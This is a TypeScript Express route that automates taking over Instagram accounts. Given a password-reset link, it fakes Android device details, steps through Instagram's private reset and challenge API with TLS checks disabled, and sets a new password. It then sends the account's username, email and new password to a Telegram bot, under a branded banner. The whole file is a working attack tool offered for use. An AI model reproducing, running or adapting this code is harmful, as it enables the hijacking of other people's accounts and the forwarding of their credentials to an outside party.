import { Router } from "express";
import { ResetPasswordBody } from "@workspace/api-zod";
import https from "https";
import crypto from "crypto";

const router = Router();

function randomHex(len: number) {
  return crypto.randomBytes(len).toString("hex");
}

function randomChoice<T>(arr: T[]): T {
  return arr[Math.floor(Math.random() * arr.length)];
}

function generateDeviceInfo(customPassword?: string | null) {
  const androidVersions = ["28/9", "29/10", "30/11", "31/12"];
  const dpis = ["240dpi", "320dpi", "480dpi"];
  const resolutions = ["720x1280", "1080x1920", "1440x2560"];
  const brands = ["samsung", "xiaomi", "huawei", "oneplus", "google"];
  const models = [
    "SM-G975F",
    "Mi-9T",
    "P30-Pro",
    "ONEPLUS-A6003",
    "Pixel-4",
  ];

  const ANDROID_ID = `android-${randomHex(8)}`;
  const USER_AGENT =
    `Instagram 394.0.0.46.81 Android (` +
    `${randomChoice(androidVersions)}; ` +
    `${randomChoice(dpis)}; ` +
    `${randomChoice(resolutions)}; ` +
    `${randomChoice(brands)}; ` +
    `${randomChoice(models)}; ` +
    `intel; en_US; ${Math.floor(Math.random() * 900000000) + 100000000})`;

  const WATERFALL_ID = crypto.randomUUID();
  const timestamp = Math.floor(Date.now() / 1000);

  let rawPass: string;
  if (customPassword) {
    rawPass = customPassword;
  } else {
    const nums = Array.from({ length: 4 }, () =>
      String(Math.floor(Math.random() * 100) + 1),
    ).join("");
    rawPass = `@pass${nums}`;
  }

  const PASSWORD = `#PWD_INSTAGRAM:0:${timestamp}:${rawPass}`;
  return { ANDROID_ID, USER_AGENT, WATERFALL_ID, PASSWORD, rawPass };
}

function makeHeaders(mid = "", userAgent = "") {
  return {
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "X-Bloks-Version-Id":
      "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
    "X-Mid": mid,
    "User-Agent": userAgent,
    "Content-Length": "9481",
  };
}

function httpsPost(
  hostname: string,
  path: string,
  headers: Record<string, string>,
  body: string,
): Promise<{ status: number; headers: Record<string, string>; body: string }> {
  return new Promise((resolve, reject) => {
    const options = {
      hostname,
      path,
      method: "POST",
      headers: { ...headers, "content-length": Buffer.byteLength(body).toString() },
      rejectUnauthorized: false,
    };

    const req = https.request(options, (res) => {
      let data = "";
      res.on("data", (chunk) => (data += chunk));
      res.on("end", () => {
        resolve({
          status: res.statusCode ?? 0,
          headers: res.headers as Record<string, string>,
          body: data,
        });
      });
    });

    req.on("error", reject);
    req.write(body);
    req.end();
  });
}

async function getUsernameById(userId: string): Promise<string | null> {
  return new Promise((resolve) => {
    const options = {
      hostname: "i.instagram.com",
      path: `/api/v1/users/${userId}/info/`,
      method: "GET",
      headers: { "User-Agent": "Instagram 219.0.0.12.117 Android" },
      rejectUnauthorized: false,
    };

    const req = https.request(options, (res) => {
      let data = "";
      res.on("data", (chunk) => (data += chunk));
      res.on("end", () => {
        try {
          const json = JSON.parse(data);
          resolve(json?.user?.username ?? null);
        } catch {
          resolve(null);
        }
      });
    });

    req.on("error", () => resolve(null));
    req.end();
  });
}

async function sendTelegram(
  botToken: string,
  chatId: string,
  text: string,
): Promise<void> {
  const body = new URLSearchParams({ chat_id: chatId, text }).toString();
  await httpsPost(
    "api.telegram.org",
    `/bot${botToken}/sendMessage`,
    { "Content-Type": "application/x-www-form-urlencoded" },
    body,
  ).catch(() => {});
}

router.post("/reset-pass", async (req, res) => {
  const parsed = ResetPasswordBody.safeParse(req.body);
  if (!parsed.success) {
    return res.status(400).json({ error: "Invalid request body" });
  }

  const { resetLink, email, chatId, botToken, customPassword } = parsed.data;

  try {
    const { ANDROID_ID, USER_AGENT, WATERFALL_ID, PASSWORD, rawPass } =
      generateDeviceInfo(customPassword ?? null);

    const uidb36 = resetLink.split("uidb36=")[1]?.split("&token=")[0];
    const token = resetLink.split("&token=")[1]?.split(":")[0];

    if (!uidb36 || !token) {
      return res
        .status(400)
        .json({ success: false, error: "Invalid reset link format" });
    }

    const body1 = new URLSearchParams({
      source: "one_click_login_email",
      uidb36,
      device_id: ANDROID_ID,
      token,
      waterfall_id: WATERFALL_ID,
    }).toString();

    const r1 = await httpsPost(
      "i.instagram.com",
      "/api/v1/accounts/password_reset/",
      makeHeaders("", USER_AGENT),
      body1,
    );

    if (!r1.body.includes("user_id")) {
      return res.json({
        success: false,
        error: `Reset request failed: ${r1.body}`,
      });
    }

    const mid = r1.headers["ig-set-x-mid"] ?? "";
    const resp1 = JSON.parse(r1.body);
    const { user_id, cni, nonce_code, challenge_context } = resp1;

    const body2 = new URLSearchParams({
      user_id: String(user_id),
      cni: String(cni),
      nonce_code: String(nonce_code),
      bk_client_context: JSON.stringify({
        bloks_version:
          "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
        styles_id: "instagram",
      }),
      challenge_context: String(challenge_context),
      bloks_versioning_id:
        "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
      get_challenge: "true",
    }).toString();

    const r2 = await httpsPost(
      "i.instagram.com",
      "/api/v1/bloks/apps/com.instagram.challenge.navigation.take_challenge/",
      makeHeaders(mid, USER_AGENT),
      body2,
    );

    const r2text = r2.body.replace(/\\/g, "");
    const challengeContextFinal = r2text
      .split(`(bk.action.i64.Const, ${cni}), "`)[1]
      ?.split(`", (bk.action.bool.Const, false)))`)[0];

    if (!challengeContextFinal) {
      return res.json({
        success: false,
        error: "Failed to parse challenge context",
      });
    }

    const body3 = new URLSearchParams({
      is_caa: "False",
      source: "",
      uidb36: "",
      afv: "",
      cni: String(cni),
      token: "",
      has_follow_up_screens: "0",
      bk_client_context: JSON.stringify({
        bloks_version:
          "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
        styles_id: "instagram",
      }),
      challenge_context: challengeContextFinal,
      bloks_versioning_id:
        "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
      enc_new_password1: PASSWORD,
      enc_new_password2: PASSWORD,
    }).toString();

    await httpsPost(
      "i.instagram.com",
      "/api/v1/bloks/apps/com.instagram.challenge.navigation.take_challenge/",
      makeHeaders(mid, USER_AGENT),
      body3,
    );

    const username = await getUsernameById(String(user_id));

    const msg =
      `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
      `   WEYN INSTAGRAM RESET PASS\n` +
      `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
      `USERNAME ➪  ${username}\n` +
      `EMAIL ➪  ${email}\n` +
      `NEW PASSWORD ➪  ${rawPass}\n\n` +
      `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
      `        BY: @jinbelowg\n` +
      `━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;

    await sendTelegram(botToken, chatId, msg);

    return res.json({ success: true, username, password: rawPass });
  } catch (err: unknown) {
    const message = err instanceof Error ? err.message : String(err);
    return res.json({ success: false, error: message });
  }
});

export default router;
